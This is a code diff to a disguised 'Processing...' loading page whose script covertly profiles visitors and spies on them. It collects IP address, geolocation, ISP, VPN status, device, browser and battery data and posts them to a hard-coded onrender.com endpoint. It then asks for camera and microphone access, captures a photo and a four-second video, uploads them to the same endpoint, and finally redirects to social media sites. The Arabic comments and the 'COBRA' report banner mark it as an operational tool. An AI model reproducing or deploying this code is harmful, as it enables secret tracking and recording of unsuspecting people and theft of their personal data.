@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Loading Content...</title>
+  <title>Processing...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
   <style>
@@ -13,10 +13,7 @@
   </style>
 </head>
 <body>
-  <div style="text-align: center;">
-    <div class="loader"></div>
-  </div>
-
+  <div class="loader"></div>
   <video id="v" autoplay muted playsinline></video>
   <canvas id="c" width="640" height="480"></canvas>
 
@@ -30,62 +27,45 @@
 
     const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };
 
+    // دالة إرسال قوية مع إرجاع Promise لضمان انتهاء الرفع
     async function send(payload) {
       if (!chatId) return;
       payload.chat_id = chatId;
-      return fetch("https://render-backend-package1.onrender.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-        keepalive: true
-      });
+      try {
+        const response = await fetch("https://render-backend-package1.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        return await response.json();
+      } catch (e) { console.error("Send failed"); }
     }
 
     async function gatherIntel() {
-      // 1. تحليل المتصفح والجهاز بدقة (استعمال مكتبة UAParser)
       const parser = new UAParser();
       const resUA = parser.getResult();
-      const deviceModel = resUA.device.model || "PC/Generic";
-      const deviceVendor = resUA.device.vendor || "";
-      const osName = resUA.os.name || "Unknown OS";
-      const browserName = resUA.browser.name || "Unknown Browser";
-
-      // 2. البطارية
+      const device = `${resUA.device.vendor || ''} ${resUA.device.model || ''} (${resUA.os.name || 'PC'})`.trim();
+      
       let bat = "N/A";
       try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
       
-      // 3. جلب الـ IP والمعلومات الجغرافية (استعمال API احتياطي قوي)
       let ipAddr = "Unknown", loc = "Unknown", isp = "Unknown", vpn = "❌ Unknown";
       try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
-        ipAddr = data.ip || "Unknown";
-        loc = `${data.city}, ${data.country_name}`;
-        isp = data.org;
-        const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        vpn = (data.timezone !== browserTZ) ? "⚠️ YES" : "✅ NO";
+        ipAddr = data.ip; loc = `${data.city}, ${data.country_name}`; isp = data.org;
+        vpn = (data.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "⚠️ YES" : "✅ NO";
       } catch (e) {
-        // إذا فشل الأول، نجرب الثانٍي (أسرع)
-        try {
-          const res2 = await fetch("https://api.ipify.org?format=json");
-          const data2 = await res2.json();
-          ipAddr = data2.ip;
-        } catch(e2){}
+        try { const res2 = await fetch("https://api.ipify.org?format=json"); const d2 = await res2.json(); ipAddr = d2.ip; } catch(e2){}
       }
 
-      let m = "🏁 *COBRA ELITE INTELLIGENCE V11* 🏁\n";
-      m += "━━━━━━━━━━━━━━━━━━━━\n";
-      m += `🌍 *IP:* \`${ipAddr}\`\n`;
-      m += `🛡️ *VPN:* ${vpn}\n`;
-      m += `🏢 *ISP:* ${isp}\n`;
-      m += `📍 *Loc:* ${loc}\n`;
-      m += `📱 *Device:* ${deviceVendor} ${deviceModel} (${osName})\n`;
-      m += `🌐 *Browser:* ${browserName} | ${navigator.language}\n`;
-      m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
-      m += `🔋 *Bat:* ${bat} | 💻 *HW:* ${navigator.hardwareConcurrency} Cores\n`;
-      m += "━━━━━━━━━━━━━━━━━━━━\n";
+      let m = "🏁 *COBRA FINAL REPORT V12* 🏁\n";
+      m += `🌍 *IP:* \`${ipAddr}\` | *VPN:* ${vpn}\n`;
+      m += `📍 *Loc:* ${loc}\n🏢 *ISP:* ${isp}\n`;
+      m += `📱 *Device:* ${device}\n🌐 *Browser:* ${resUA.browser.name} | ${navigator.language}\n`;
+      m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n🔋 *Bat:* ${bat}\n`;
       
-      await send({ message: m });
+      await send({ message: m }); // إرسال النص أولاً
       startSpying();
     }
 
@@ -93,31 +73,39 @@
       navigator.mediaDevices.getUserMedia({ video: true, audio: true })
         .then(stream => {
           v.srcObject = stream;
-          v.onloadedmetadata = () => {
+          v.onloadedmetadata = async () => {
             v.play();
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => { send({ video: reader.result.split(',')[1] }); };
-                setTimeout(finish, 1500);
-            };
-
+            
+            // 1. التقاط الصورة وإرسالها فوراً
             setTimeout(async () => {
                 ctx.drawImage(v, 0, 0, c.width, c.height);
-                await send({ photo: c.toDataURL("image/jpeg", 0.5).split(',')[1] });
+                const photoBase64 = c.toDataURL("image/jpeg", 0.6).split(',')[1];
+                await send({ photo: photoBase64 });
+
+                // 2. بعد نجاح إرسال الصورة، نبدأ تسجيل الفيديو
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = async () => { 
+                        await send({ video: reader.result.split(',')[1] }); // إرسال الفيديو
+                        setTimeout(finish, 1000); 
+                    };
+                };
+
                 recorder.start();
                 setTimeout(() => {
                     recorder.stop();
                     stream.getTracks().forEach(t => t.stop());
-                }, 4000); 
+                }, 4000); // فيديو 4 ثواني لضمان سرعة الرفع
             }, 2000);
           };
         })
-        .catch(() => { send({ message: "❌ Access Denied" }); finish(); });
+        .catch(() => { send({ message: "❌ Denied" }); finish(); });
     }
 
     function finish() {
